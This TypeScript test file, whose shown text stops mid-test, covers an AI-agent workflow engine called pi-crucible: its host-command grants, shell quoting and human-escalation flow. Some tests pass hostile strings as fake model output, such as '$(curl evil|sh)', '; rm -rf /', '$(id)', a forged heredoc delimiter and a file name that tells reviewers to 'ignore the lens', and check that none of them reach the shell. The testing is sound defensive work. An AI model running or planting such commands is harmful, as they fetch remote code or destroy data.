// Runs workflows/crucible.js the way the pi-subagents sandbox does (the file is the body of an async
// function of `args` and `runs`), with a fake `runs` that records every child task and answers from
// a script of structured outputs, and a fake `runs.host` that admits only the resource's grants.
import { test } from "node:test";
import assert from "node:assert/strict";
import { CheckGrants, crucibleResource, GIT_TIMEOUT_MS, CHECK_TIMEOUT_MS, HOST_LIMIT, loadScript, MAX_ROUNDS } from "../src/resource.ts";
import { engineConfig, validArgs } from "./fixtures.ts";

type Opts = { agent: string; model: string; task: string; skill?: string; outputSchema?: { required?: string[] } };
// `invalid`: the test sends a report its stage's schema rejects on purpose.
type Answer = { ok?: boolean; structuredOutput?: unknown; error?: string; invalid?: true };
// A host command's outcome, as pi-subagents reports it: exit (nonzero) and timeout reject with its
// message; error rejects with that text (the command never ran).
type HostAnswer = { stdout?: string; exit?: number | "unknown"; timeout?: true; error?: string };
type Grant = { key: string; command: string };
const AsyncFunction = Object.getPrototypeOf(async () => {}).constructor;
const { validateStructuredOutputValue } = await import(
  new URL("../node_modules/pi-subagents/src/runs/shared/structured-output.js", import.meta.url).href
);
const validates = async (schema: unknown, value: unknown) => (await validateStructuredOutputValue(schema, value)).status === "valid";

const NUMSTAT = "1\t0\ta.ts\n119\t0\tb.ts\n 2 files changed, 120 insertions(+)\n\ndiff --git a/a.ts b/a.ts\n";
// Where a round's diff is: a fixed path in the worktree, the same in every run.
const diffAt = (round: number, worktree = "/tmp/repo-worktrees/issue-2") => `${worktree}/.pi/crucible-review/r${round}.diff`;
const defaultHost = (key: string, where: { worktree: string; branch: string }): HostAnswer => {
  if (key === "host-worktree") return { stdout: `${where.worktree}\n${where.branch}\n` };
  if (key.endsWith("-fetch")) return { stdout: "c57139f\n" };
  if (key.endsWith("-heads")) return { stdout: "c57139f000000000000000000000000000000000\nabc1234000000000000000000000000000000000\n" };
  if (key.startsWith("host-diff-")) return { stdout: NUMSTAT };
  return { stdout: "" };
};

let simulations = 0;
/**
 * Launched by name (the default), the script is resolve's: CRUCIBLE_ARGS, CRUCIBLE_HOST and the
 * grants. `raw` runs the bare script with sandbox args, as a launch by path does: no host authority.
 * `checkGrants` is what the extension recorded; by default, the args' own checks, as /crucible
 * records them. Each simulation is a new run id, as an auto-resume is.
 */
export async function simulate(
  args: Record<string, unknown>,
  answer: (key: string, opts: Opts) => Answer,
  options: { host?: (key: string) => HostAnswer | undefined; raw?: boolean; script?: string; grants?: Grant[]; checkGrants?: CheckGrants } = {},
) {
  const runId = `run-${++simulations}`;
  const calls: (Opts & { key: string })[] = [];
  const hostCalls: { key: string; command: string; timeoutMs: number; output?: string }[] = [];
  const events: string[] = [];
  let script = options.script ?? loadScript();
  let sandboxArgs = args;
  let grants = options.grants ?? null;
  if (!options.script && !options.raw) {
    let checkGrants = options.checkGrants;
    if (!checkGrants) {
      checkGrants = new CheckGrants();
      const config = args.config as { checks?: { name: string; command: string }[] } | undefined;
      if (config?.checks) checkGrants.record({ worktree: String(args.worktree), checks: config.checks });
    }
    const resolved = crucibleResource(script, undefined, checkGrants).resolve(args);
    if ("script" in resolved) {
      script = resolved.script;
      grants = resolved.hostCommands;
      sandboxArgs = {};
    }
  }
  const where = { worktree: String(args.worktree ?? validArgs.worktree), branch: String(args.branch ?? validArgs.branch) };
  const run = async (key: string, opts: Opts) => {
    calls.push({ key, ...opts });
    events.push(key);
    const a = answer(key, opts);
    if (opts.outputSchema && a.structuredOutput !== undefined) {
      // A fake flagged invalid must really be invalid, so the flag can't go stale and hide drift.
      assert.equal(await validates(opts.outputSchema, a.structuredOutput), !a.invalid, `the fake ${key} report must ${a.invalid ? "fail" : "satisfy"} its schema`);
    }
    return { ok: a.ok ?? true, structuredOutput: a.structuredOutput, error: a.error };
  };
  const host = async (key: string, params: { kind: string; command: string; timeoutMs: number; output?: string }) => {
    // pi-subagents: a raw script has no host authority; a resource may run only an exact key/command grant.
    if (!grants) throw new Error("runs.host is unavailable in this host context.");
    assert.deepEqual(Object.keys(params).filter((k) => k !== "output").sort(), ["command", "kind", "timeoutMs"], key);
    assert.ok(grants.some((g) => g.key === key && g.command === params.command.trim()), `${key}: "${params.command}" is not granted`);
    assert.ok(!hostCalls.some((h) => h.key === key), `${key} runs once per run`);
    hostCalls.push({ key, command: params.command, timeoutMs: params.timeoutMs, ...(params.output ? { output: params.output } : {}) });
    events.push(key);
    const a = options.host?.(key) ?? defaultHost(key, where);
    if (a.error) throw new Error(a.error);
    if (a.exit) throw new Error(`Host command '${key}' failed: Command exited with code ${a.exit}. ${a.stdout ?? ""}`.slice(0, 230));
    if (a.timeout) throw new Error(`Host command '${key}' failed: Command timed out after ${params.timeoutMs}ms.`);
    // pi-subagents: an explicit output is in the workflow cwd; the default is in this run's artifacts.
    const outputPath = params.output ? `${where.worktree}/${params.output}` : `/art/outputs/${runId}/host/${key}.log`;
    return { key, kind: "command", ok: true, state: "passed", exitCode: 0, stdout: a.stdout ?? "", stderr: "", outputPath, durationMs: 1 };
  };
  const runs = { run, all: (list: (Opts & { key: string })[]) => Promise.all(list.map((o) => run(o.key, o))), host };
  const result = await new AsyncFunction("args", "runs", script)(sandboxArgs, runs);
  return { result, calls, hostCalls, events, task: (key: string) => calls.find((c) => c.key === key)?.task ?? "" };
}

const happy = (overrides: Record<string, Answer> = {}) => (key: string): Answer => {
  if (overrides[key]) return overrides[key];
  if (key === "spec") return { structuredOutput: { status: "ready", spec_path: "docs/specs/2-scaffold.md", blocking_questions: [] } };
  if (key === "implement") return { structuredOutput: { status: "done", summary: "s", changed_files: ["a.ts"], checks: { test: "pass" } } };
  if (key.startsWith("review-")) return { structuredOutput: { verdict: "approve", findings: [] } };
  if (key === "integrate" || key === "integrate-recheck") return { structuredOutput: { status: "done", summary: "", merge: "merged", conflicts: [] } };
  if (key === "integrate-fix") return { structuredOutput: { status: "done", summary: "renamed call", changed_files: ["a.ts"], non_test_files: ["a.ts"], checks: { test: "pass" } } };
  if (key === "pr") return { structuredOutput: { pr_url: "https://github.com/o/r/pull/9", draft: false, followup_issue: null } };
  return { structuredOutput: {} };
};
// Host answers by key; unnamed keys get defaultHost's.
const hostWith = (answers: Record<string, HostAnswer>) => (key: string) => answers[key];

const args = { ...validArgs, repo: "owner/repo", worktree: "/tmp/repo-worktrees/issue-2", startAt: undefined, lenses: ["code", "ux"] };

test("every stage's prompt comes from the config, not the engine", async () => {
  const { result, calls, task } = await simulate(args, happy());
  assert.deepEqual(calls.map((c) => c.key), ["spec", "implement", "review-code-r0", "review-ux-r0", "integrate", "pr"]);
  for (const c of calls) assert.match(c.task, /The design record is README\.md\./, c.key);
  assert.match(task("spec"), /Design \(files and interfaces\)/);
  assert.match(task("implement"), /Tests never use the network\.\n/);
  assert.match(task("implement"), /- test: npm test/);
  assert.match(task("review-code-r0"), /Lens: CODE review\./);
  assert.match(task("review-ux-r0"), /Lens: UX review\./);
  assert.match(task("pr"), /Engine: seandavi\/pi-crucible@4d310bf \(with uncommitted changes\)/);
  assert.match(task("spec"), /Commit with: git commit\n/, "no commitAuthor: the worktree's identity");
  const all = calls.map((c) => c.task).join("\n");
  assert.doesNotMatch(all, /bioc|zod|MCP tool|workers-best-practices|seandavi@/i);
  assert.equal(calls.find((c) => c.key === "implement")?.skill, undefined);
  assert.deepEqual(calls.find((c) => c.key === "implement")?.outputSchema && (calls.find((c) => c.key === "implement")!.outputSchema as { properties: { checks: { required: string[] } } }).properties.checks.required, ["test"]);
  assert.equal(result.pr, "https://github.com/o/r/pull/9");
  assert.equal(result.draft, false);
  assert.deepEqual(result.engine, { commit: "4d310bf", dirty: true });
});

test("the commit identity is single-quoted, so no part of it reaches the shell", async () => {
  const config = { ...engineConfig, commitAuthor: { name: "Pat O'Brien", email: "pat@example.org" } };
  const { task } = await simulate({ ...args, config }, happy());
  assert.ok(task("spec").includes(`git -c 'user.name=Pat O'\\''Brien' -c 'user.email=pat@example.org' commit`));
});

test("models, skills, commit identity and spec dir follow the config", async () => {
  const config = {
    ...engineConfig,
    specDir: "design/specs",
    models: { strong: "p/strong", fast: "p/fast", small: "p/small" },
    skills: { build: "build-skill", lenses: { code: "code-skill" } },
    commitAuthor: { name: "A B", email: "a@b.c" },
  };
  const { calls, task } = await simulate({ ...args, config }, happy(), { host: hostWith({ "check-test": { exit: 1 } }) });
  const by = (k: string) => calls.find((c) => c.key === k)!;
  assert.equal(by("integrate").model, "p/small");
  assert.equal(by("integrate-recheck").model, "p/small");
  assert.equal(by("integrate-fix").model, "p/fast");
  assert.equal(by("integrate-fix").skill, "build-skill");
  assert.equal(by("spec").model, "p/strong");
  assert.equal(by("implement").model, "p/fast");
  assert.equal(by("pr").model, "p/fast");
  assert.equal(by("implement").skill, "build-skill");
  assert.equal(by("review-code-r0").skill, "code-skill");
  assert.equal(by("review-ux-r0").skill, undefined);
  assert.match(task("spec"), /Write design\/specs\/2-scaffold\.md/);
  assert.match(task("spec"), /git -c 'user\.name=A B' -c 'user\.email=a@b\.c' commit/);
});

test("the checks the PR reports are the integration's", async () => {
  const implementFails = { structuredOutput: { status: "done", summary: "s", changed_files: ["a.ts"], checks: { test: "fail" } } };
  const passes = await simulate(args, happy({ implement: implementFails }));
  assert.equal(passes.result.checks.test, "pass");
  assert.equal(passes.result.draft, false);
  const fails = await simulate(args, happy({ implement: implementFails }), { host: hostWith({ "check-test": { exit: 1 }, "recheck-test": { exit: 1 } }) });
  assert.equal(fails.result.checks.test, "fail");
  assert.equal(fails.result.draft, true);
  assert.equal(fails.result.integration.status, "fail");
});

test("blocker findings trigger revise and a re-review by that lens only", async () => {
  let round = 0;
  const { calls, task } = await simulate(args, (key) => {
    if (key === "review-code-r0") return { structuredOutput: { verdict: "changes", findings: [{ id: "code-r0-1", severity: "blocker", location: "a.ts", problem: "p", fix: "f" }] } };
    if (key === "revise-r1") { round++; return { structuredOutput: { status: "done", summary: "s", responses: [{ id: "code-r0-1", action: "fixed" }], changed_files: ["a.ts"], checks: { test: "pass" } } }; }
    return happy()(key);
  });
  assert.equal(round, 1);
  assert.deepEqual(calls.map((c) => c.key), ["spec", "implement", "review-code-r0", "review-ux-r0", "revise-r1", "review-code-r1", "integrate", "pr"]);
  assert.match(task("revise-r1"), /- test: npm test/);
});

test("a spec with blocking questions stops and flags a human", async () => {
  const { result, calls } = await simulate(args, happy({
    spec: { structuredOutput: { status: "blocked", spec_path: "x", blocking_questions: ["Which DB?"] } },
  }));
  assert.deepEqual(calls.map((c) => c.key), ["spec", "flag-spec"]);
  assert.match(calls[1].task, /Which DB\?/);
  assert.equal(result.stopped, true);
});

test("the script refuses to run without config or with a lens it has no text for", async () => {
  await assert.rejects(simulate({ ...args, config: undefined }, happy()), /args\.config is required/);
  await assert.rejects(simulate({ ...args, lenses: ["security"] }, happy()), /no lens text in config for: security/);
});

test("code review runs whatever lenses a hand launch names", async () => {
  const { calls } = await simulate({ ...args, lenses: ["ux"] }, happy());
  assert.deepEqual(calls.map((c) => c.key), ["spec", "implement", "review-code-r0", "review-ux-r0", "integrate", "pr"]);
  const { calls: dup } = await simulate({ ...args, lenses: ["code", "ux", "code"] }, happy());
  assert.equal(dup.filter((c) => c.key === "review-code-r0").length, 1);
});

test("every writing stage checks the worktree's HEAD before working, with the path single-quoted", async () => {
  const { calls } = await simulate({ ...args, worktree: "/tmp/my repo/issue-2" }, happy());
  const guarded = calls.filter((c) => !c.key.startsWith("flag-") && !c.key.startsWith("review-"));
  assert.deepEqual(guarded.map((c) => c.key), ["spec", "implement", "integrate", "pr"]);
  for (const c of guarded) {
    assert.match(c.task, /BEFORE ANYTHING ELSE run: git -C '\/tmp\/my repo\/issue-2' rev-parse --abbrev-ref HEAD\nIf the output is not exactly issue-2-scaffold, change nothing and stop/, c.key);
    assert.doesNotMatch(c.task, /\/tmp\/my repo\/issue-2(?<!')[ \n]/, c.key);
  }
});

test("a stop creates the needs:human label if the repository lacks it, and reports whether it flagged", async () => {
  const { result, task } = await simulate(args, happy({
    spec: { structuredOutput: { status: "blocked", spec_path: "x", blocking_questions: ["Which DB?"] } },
  }));
  assert.match(task("flag-spec"), /gh label create needs:human -R owner\/repo --description "Waiting on a person" 2>\/dev\/null \|\| true\n\s+gh issue edit 2 -R owner\/repo --add-label needs:human/);
  assert.doesNotMatch(task("flag-spec"), /rev-parse/, "flagging must work even when the worktree is wrong");
  assert.equal(result.flagged, true);
  const failed = await simulate(args, (key) => (key === "flag-spec" ? { ok: false } : happy({ spec: { structuredOutput: { status: "blocked", spec_path: "x", blocking_questions: [] } } })(key)));
  assert.equal(failed.result.flagged, false);
});

test("the PR stage creates the needs:human label before adding it", async () => {
  const { task } = await simulate(args, happy());
  assert.match(task("pr"), /gh label create needs:human -R owner\/repo --description "Waiting on a person" 2>\/dev\/null \|\| true\n\s+gh pr edit issue-2-scaffold -R owner\/repo --add-label needs:human/);
});

test("only the writing stages run the worktree check; reviewers have no shell", async () => {
  const { calls } = await simulate(args, happy());
  for (const c of calls) {
    const writes = !c.key.startsWith("review-");
    assert.equal(/rev-parse --abbrev-ref HEAD/.test(c.task), writes, c.key);
  }
});

test("a PR stage that opens no PR, or fails, flags a human and stops", async () => {
  for (const pr of [{ structuredOutput: { pr_url: "", followup_issue: null } }, { ok: false, error: "boom" }]) {
    const { result, calls } = await simulate(args, happy({ pr }));
    assert.equal(calls.at(-1)?.key, "flag-pr");
    assert.equal(result.stopped, true);
    assert.equal(result.stage, "pr");
  }
  const { calls } = await simulate(args, happy({ pr: { ok: false, error: "boom" } }));
  assert.match(calls.at(-1)!.task, /Stage: pr\. boom/);
});

// ---- Host commands (#57) ---------------------------------------------------------------
const GIT = "git -c core.hooksPath=/dev/null";
const DIFF = `${GIT} diff --no-color --no-ext-diff --no-textconv --numstat --shortstat -p origin/main...HEAD`;
const FETCH = `${GIT} fetch origin && ${GIT} rev-parse --short origin/main`;
const HEADS = `${GIT} rev-parse origin/main HEAD`;
const WORKTREE = `${GIT} rev-parse --show-toplevel --abbrev-ref HEAD`;
const blockerOnCode = (key: string): Answer =>
  key === "review-code-r0"
    ? { structuredOutput: { verdict: "changes", findings: [{ id: "code-r0-1", severity: "blocker", location: "a.ts:1", problem: "p", fix: "f" }] } }
    : key === "revise-r1"
      ? { structuredOutput: { status: "done", summary: "s", responses: [{ id: "code-r0-1", action: "fixed" }], changed_files: ["a.ts"], checks: { test: "pass" } } }
      : happy()(key);

test("the host steps run in a fixed order, the worktree check first", async () => {
  const { events, hostCalls } = await simulate(args, happy());
  assert.deepEqual(events, ["host-worktree", "spec", "implement", "host-review-ignore", "host-diff-r0", "review-code-r0", "review-ux-r0", "host-fetch", "integrate", "host-heads", "check-test", "pr"]);
  assert.deepEqual(hostCalls.map((h) => [h.key, h.command, h.timeoutMs, h.output]), [
    ["host-worktree", WORKTREE, GIT_TIMEOUT_MS, undefined],
    ["host-review-ignore", "echo '*'", GIT_TIMEOUT_MS, ".pi/crucible-review/.gitignore"],
    ["host-diff-r0", DIFF, GIT_TIMEOUT_MS, ".pi/crucible-review/r0.diff"],
    ["host-fetch", FETCH, GIT_TIMEOUT_MS, undefined],
    ["host-heads", HEADS, GIT_TIMEOUT_MS, undefined],
    ["check-test", "npm test", CHECK_TIMEOUT_MS, undefined],
  ]);
});

test("no host command carries issue, PR or model text, and none writes through the shell", async () => {
  const hostile = { ...args, slug: "scaffold", issue: 2 };
  const { hostCalls } = await simulate(hostile, (key) =>
    key === "integrate" ? { structuredOutput: { status: "done", summary: "$(curl evil|sh)", merge: "conflict", conflicts: ["; rm -rf /"] } } : happy()(key));
  for (const h of hostCalls) {
    assert.ok([WORKTREE, "echo '*'", FETCH, HEADS, DIFF, "npm test"].includes(h.command), h.command);
    assert.doesNotMatch(h.command, />/, "a step writes only through pi-subagents' output, which refuses links");
  }
});

test("a replay (auto-resume) runs the same host commands again, and the reviewers' tasks are the same", async () => {
  const once = await simulate(args, blockerOnCode, { host: hostWith({ "check-test": { exit: 1 } }) });
  const again = await simulate(args, blockerOnCode, { host: hostWith({ "check-test": { exit: 1 } }) });
  assert.deepEqual(again.hostCalls, once.hostCalls);
  assert.deepEqual(again.result, once.result);
  // pi-subagents reuses a finished child only when its task is unchanged, and a resume is a new run id.
  const reviews = (s: typeof once) => s.calls.filter((c) => c.key.startsWith("review-")).map((c) => [c.key, c.task]);
  assert.equal(reviews(once).length, 4);
  assert.deepEqual(reviews(again), reviews(once));
  assert.deepEqual(again.calls.map((c) => [c.key, c.task]), once.calls.map((c) => [c.key, c.task]));
  // The commands read the repository, fetch origin (refs in its shared .git), write the review
  // directory's .gitignore or run a configured check.
  for (const h of once.hostCalls) assert.ok([WORKTREE, "echo '*'", FETCH, HEADS, DIFF, "npm test"].includes(h.command), h.key);
});

test("a replay after main moved merges again, and the record names the main it merged", async () => {
  const once = await simulate(args, happy());
  const moved = await simulate(args, happy(), { host: hostWith({ "host-fetch": { stdout: "d00d00d\n" }, "host-heads": { stdout: "d00d00d000000000000000000000000000000000\nbeef123000000000000000000000000000000000\n" } }) });
  assert.match(once.task("integrate"), /origin\/main is at c57139f/);
  assert.match(moved.task("integrate"), /origin\/main is at d00d00d/);
  assert.notEqual(moved.task("integrate"), once.task("integrate"), "a changed task is not reused");
  assert.equal(moved.result.integration.main, "d00d00d");
  assert.equal(moved.result.integration.head, "beef123");
  assert.equal(moved.task("review-code-r0"), once.task("review-code-r0"), "review is reused all the same");

  const recheck = await simulate(args, happy(), { host: hostWith({ "check-test": { exit: 1 }, "host-recheck-fetch": { stdout: "e11e11e\n" } }) });
  assert.match(recheck.task("integrate-recheck"), /origin\/main is at e11e11e/);
  const odd = await simulate(args, happy(), { host: hostWith({ "host-fetch": { stdout: "From github.com:o/r\n" } }) });
  assert.ok(!keysOf(odd.calls).includes("integrate"));
  assert.equal(odd.result.integration.note, "git rev-parse --short origin/main after the fetch: unexpected output");
});

test(`at the most a run can ask for, it stays within pi-subagents' ${HOST_LIMIT} grants and ${HOST_LIMIT} host calls`, async () => {
  const names = Array.from({ length: 8 }, (_, i) => `c${i}`);
  const config = { ...engineConfig, checks: names.map((name) => ({ name, command: `npm run ${name}` })) };
  const all = Object.fromEntries(names.map((n) => [n, "pass"]));
  const blocker = (id: string) => ({ structuredOutput: { verdict: "changes", findings: [{ id, severity: "blocker", location: "a.ts:1", problem: "p", fix: "f" }] } });
  const { calls, hostCalls } = await simulate({ ...args, config, maxRounds: MAX_ROUNDS }, (key) => {
    if (/^review-code-r[0-5]$/.test(key)) return blocker(`${key}-1`);
    if (key === "implement") return { structuredOutput: { status: "done", summary: "s", changed_files: ["a.ts"], checks: all } };
    if (key.startsWith("revise-")) return { structuredOutput: { status: "done", summary: "s", responses: [], changed_files: ["a.ts"], checks: all } };
    if (key === "integrate-fix") return { structuredOutput: { status: "done", summary: "f", changed_files: ["a.ts"], non_test_files: ["a.ts"], checks: all } };
    return happy()(key);
  }, { host: hostWith({ "check-c0": { exit: 1 } }) });
  assert.ok(keysOf(calls).includes(`review-code-r${MAX_ROUNDS + 1}`), "every review round and the fix's re-review ran");
  const resolved = crucibleResource("x", undefined, (() => { const g = new CheckGrants(); g.record({ worktree: args.worktree, checks: config.checks }); return g; })()).resolve({ ...args, config, maxRounds: MAX_ROUNDS }) as { hostCommands: Grant[] };
  assert.equal(resolved.hostCommands.length, 29);
  assert.equal(hostCalls.length, 29);
  assert.ok(resolved.hostCommands.length <= HOST_LIMIT && hostCalls.length <= HOST_LIMIT);
});

test("before each review round the host writes the diff to a fixed, git-ignored path in the worktree", async () => {
  const { events, task, hostCalls } = await simulate(args, blockerOnCode);
  assert.ok(events.indexOf("host-review-ignore") < events.indexOf("host-diff-r0"));
  assert.equal(hostCalls.filter((h) => h.key === "host-review-ignore").length, 1, "once per run");
  assert.ok(events.indexOf("host-diff-r0") < events.indexOf("review-code-r0"));
  assert.ok(events.indexOf("host-diff-r1") < events.indexOf("review-code-r1"));
  assert.ok(task("review-code-r1").includes(diffAt(1)));
  assert.ok(!task("review-code-r1").includes("r0.diff"));
  assert.doesNotMatch(task("review-code-r0"), /\/art\/outputs/);

  const unignored = await simulate(args, happy(), { host: hostWith({ "host-review-ignore": { exit: 1, stdout: "read-only" } }) });
  assert.ok(!unignored.hostCalls.some((h) => h.key.startsWith("host-diff-")), "no diff in the worktree without its .gitignore");
  assert.equal(unignored.result.rounds[0].diff, "unavailable: Command exited with code 1. read-only");
});

test("every reviewer reads the round's diff and cites hunks", async () => {
  const { task } = await simulate(args, happy());
  for (const key of ["review-code-r0", "review-ux-r0"]) {
    assert.ok(task(key).includes(diffAt(0)), key);
    assert.ok(task(key).includes("(+120 -0 lines, 2 files)"), key);
    assert.ok(task(key).includes("Changed files: `a.ts`, `b.ts`."), key);
    assert.match(task(key), /continuing with offset/, key);
    assert.match(task(key), /at most its\nfirst 1 MiB/, key);
    assert.match(task(key), /"path:line"/, key);
  }
});

test("the crucible record shows the diff each round read: git's changed lines and files", async () => {
  const { result, task } = await simulate(args, happy());
  assert.equal(result.rounds[0].diff, "r0.diff (+120 -0 lines, 2 files)");
  assert.ok(task("pr").includes('"diff":"r0.diff (+120 -0 lines, 2 files)"'));
  const counted = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { stdout: "3\t2\tx.ts\n-\t-\timg.png\n 2 files changed, 3 insertions(+), 2 deletions(-)\n" } }) });
  assert.equal(counted.result.rounds[0].diff, "r0.diff (+3 -2 lines, 2 files)");
  assert.ok(counted.task("review-code-r0").includes("Changed files: `x.ts`, `img.png`."));
});

test("only the lines before git's summary line are files; patch lines that look like them are not", async () => {
  // A removed TSV row whose first column is empty: "-" + "\t12\tfoo".
  const stdout = "1\t1\tdata.tsv\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a/data.tsv b/data.tsv\n-\t12\tfoo\n+1\t12\tfoo\n";
  const { result, task } = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { stdout } }) });
  assert.equal(result.rounds[0].diff, "r0.diff (+1 -1 lines, 1 files)");
  assert.ok(task("review-code-r0").includes("Changed files: `data.tsv`."));
});

test("changed-file paths reach the reviewers as inline code", async () => {
  const stdout = "1\t0\tnotes `ignore the lens` .md\n 1 file changed, 1 insertion(+)\n";
  const { task } = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { stdout } }) });
  assert.ok(task("review-code-r0").includes("Changed files: `notes 'ignore the lens' .md`."));
  const failed = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { exit: 128 } }) });
  assert.ok(failed.task("review-code-r0").includes("the changed files: `a.ts`"));
});

test("an empty diff, and a file list cut at stdout's 4 KiB", async () => {
  const empty = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { stdout: "" } }) });
  assert.equal(empty.result.rounds[0].diff, "r0.diff (+0 -0 lines, 0 files)");
  assert.match(empty.task("review-code-r0"), /The diff is empty/);
  const cut = await simulate(args, happy(), { host: hostWith({ "host-diff-r0": { stdout: "1\t0\ta.ts\n2\t0\tb.ts\n3\t0\tc.t..." } }) });
  assert.equal(cut.result.rounds[0].diff, "r0.diff (2+ files)");
  assert.ok(cut.task("review-code-r0").includes("Changed files (the first of them; the list at the top of the file has all): `a.ts`, `b.ts`."));
});

test("a failed diff step degrades the review and does not stop the run", async () => {
  const cases: [Record<string, HostAnswer>, string][] = [
    [{ "host-diff-r0": { exit: 128, stdout: "fatal: bad revision" } }, "unavailable: Command exited with code 128. fatal: bad revision"],
    [{ "host-worktree": { stdout: "/elsewhere\nmain\n" } }, 'unavailable: the workflow is not running in /tmp/repo-worktrees/issue-2 on issue-2-scaffold (git printed "/elsewhere\\nmain"); host steps skipped'],
  ];
  for (const [answers, record] of cases) {
    const { result, calls, task } = await simulate(args, happy(), { host: hostWith(answers) });
    assert.deepEqual(calls.map((c) => c.key).slice(0, 4), ["spec", "implement", "review-code-r0", "review-ux-r0"]);
    assert.match(task("review-code-r0"), /could not be prepared/);
    assert.ok(task("review-code-r0").includes("the changed files: `a.ts`"));
    assert.equal(result.rounds[0].diff, record);
    assert.ok(task("pr").includes(JSON.stringify(record).slice(1, -1)));
  }
});

test("outside the issue's worktree no other host command runs", async () => {
  const { hostCalls, result, calls } = await simulate(args, happy(), { host: hostWith({ "host-worktree": { stdout: "/src/repo\nissue-2-scaffold\n" } }) });
  assert.deepEqual(hostCalls.map((h) => h.key), ["host-worktree"]);
  assert.ok(!calls.some((c) => c.key === "integrate"), "no merge when its fetch and checks cannot run");
  assert.equal(result.integration.status, "error");
  assert.match(result.integration.note, /^the workflow is not running in \/tmp\/repo-worktrees\/issue-2/);
  assert.equal(result.draft, true);
});

test("model text in the needs:human note stays inside one code span", async () => {
  const sneaky = "merge failed\n\n@someone **hi**";
  const { task } = await simulate(args, happy({ integrate: { structuredOutput: { status: "blocked", summary: sneaky } }, pr: { ok: false, error: "boom" } }));
  const flag = task("flag-pr");
  assert.ok(!flag.includes("\n\n@someone"), "a blank line would end the code span");
  assert.ok(flag.includes("merge failed @someone **hi**`"));
});

test("launched by path there is no host authority, and the record and the stop say why", async () => {
  const { hostCalls, result, calls, task } = await simulate(args, happy(), { raw: true });
  assert.deepEqual(hostCalls, []);
  const why = "launched without the pi-crucible resource; host steps unavailable";
  assert.equal(result.rounds[0].diff, `unavailable: ${why}`);
  assert.equal(result.integration.status, "error");
  assert.equal(result.integration.note, why);
  assert.ok(!calls.some((c) => c.key === "integrate"));
  assert.ok(task("pr").includes(why));
  const stopped = await simulate(args, happy({ pr: { ok: false, error: "boom" } }), { raw: true });
  assert.ok(stopped.task("flag-pr").includes(`Integration: \`${why}\``));
});

test("checks the extension did not record are not granted: integration is an error that says why", async () => {
  const { result, hostCalls, calls } = await simulate(args, happy(), { checkGrants: new CheckGrants() });
  assert.ok(!hostCalls.some((h) => /check-/.test(h.key)));
  assert.ok(!keysOf(calls).includes("integrate-fix"), "not a failing check");
  assert.equal(result.integration.status, "error");
  assert.equal(
    result.integration.note,
    "check test could not run: no host grant for check-test: the checks are granted only for a config /crucible read from origin/main in this session; relaunch with /crucible",
  );
  assert.equal(result.draft, true);
});

test("the needs:human comment is a quoted heredoc, and reported text in it is inline code", async () => {
  const note = "`@everyone` $(id) CRUCIBLE_EOF";
  const { task } = await simulate(args, happy({ integrate: { ok: false, error: note }, pr: { ok: false, error: "boom" } }));
  const flag = task("flag-pr");
  assert.ok(flag.includes("gh issue comment 2 -R owner/repo --body-file - <<'CRUCIBLE_EOF'\npi-crucible stopped and needs a human.\n\nStage: pr. boom"));
  assert.ok(flag.includes("\nIntegration: `'@everyone' $(id) CRUCIBLE-EOF`\nCRUCIBLE_EOF"), flag);
  assert.equal(flag.split("CRUCIBLE_EOF").length, 3, "the delimiter opens and closes the body only");
});

// The regression behind the first /crucible run (2fbd7098): pi-subagents gives a named resource's args
// only to resolve and starts the sandbox with empty args. Resolve the way the subagent tool does and
// run the result exactly so.
test("launched by name, the script gets its args and host table from resolve, not the sandbox", async () => {
  const { resolveWorkflowResource } = await import(
    new URL("../node_modules/pi-subagents/src/workflows/workflow-resources.js", import.meta.url).href
  );
  const { registerWorkflowResource } = await import("pi-subagents/workflow-resources");
  const checkGrants = new CheckGrants();
  checkGrants.record({ worktree: args.worktree, checks: engineConfig.checks });
  const reg = registerWorkflowResource({ sessionId: "by-name", definition: crucibleResource(loadScript(), undefined, checkGrants) });
  try {
    const { startAt: _unset, ...jsonArgs } = args;
    const resolved = resolveWorkflowResource("pi-crucible", jsonArgs, "by-name");
    assert.equal(resolved.ok, true, resolved.error);
    const grants = (crucibleResource(loadScript(), undefined, checkGrants).resolve(jsonArgs) as { hostCommands: Grant[] }).hostCommands;
    const { result, task, hostCalls } = await simulate(jsonArgs, happy(), { script: resolved.resource.script, grants });
    assert.equal(result.pr, "https://github.com/o/r/pull/9");
    assert.equal(result.integration.status, "pass");
    assert.match(task("spec"), /Repository: owner\/repo, issue #2\./);
    assert.equal(hostCalls.length, 6);
  } finally {
    reg.dispose();
  }
});

test("on --start-at review the reviewers get git's file list", async () => {
  const { calls, task } = await simulate({ ...args, startAt: "review" }, happy());
  assert.deepEqual(calls.map((c) => c.key), ["review-code-r0", "review-ux-r0", "integrate", "pr"]);
  assert.ok(task("review-code-r0").includes("Changed files: `a.ts`, `b.ts`."));
});

// ---- Integration (#5) ------------------------------------------------------------------
const mergeLine = "  git -C '/tmp/repo-worktrees/issue-2' merge --no-edit -m 'Merge origin/main into issue-2-scaffold for the integration check' -m 'Co-Authored-By: Claude <noreply@anthropic.com>' origin/main\n";
const merged = (extra: Record<string, unknown> = {}): Answer => ({ structuredOutput: { status: "done", summary: "", merge: "merged", conflicts: [], ...extra } });
const conflict: Answer = { structuredOutput: { status: "done", summary: "", merge: "conflict", conflicts: ["src/tools.ts"] } };
const failingTest = (stdout = "boom") => hostWith({ "check-test": { exit: 1, stdout } });
const keysOf = (calls: { key: string }[]) => calls.map((c) => c.key);

test("after review, the host fetches, a Haiku worker only merges, and the host runs every check", async () => {
  const { calls, task } = await simulate(args, happy());
  const integrate = calls.find((c) => c.key === "integrate")!;
  assert.equal(integrate.agent, "worker");
  assert.equal(integrate.model, "claude-bridge/claude-haiku-5-5");
  const keys = keysOf(calls);
  assert.deepEqual(keys.slice(-2), ["integrate", "pr"]);
  assert.ok(task("integrate").includes(mergeLine));
  assert.match(task("integrate"), /merge --abort/);
  assert.match(task("integrate"), /the one exception to "never/);
  assert.match(task("integrate"), /BEFORE ANYTHING ELSE run: git -C '[^']+' rev-parse --abbrev-ref HEAD/);
  assert.match(task("integrate"), /do not fetch, do not run any check/);
  assert.doesNotMatch(task("integrate"), /npm test|fetch origin|rev-parse --short|last 80 lines/, "the agent runs no check, fetch or rev-parse");
  const schema = integrate.outputSchema as unknown as { properties: Record<string, unknown> };
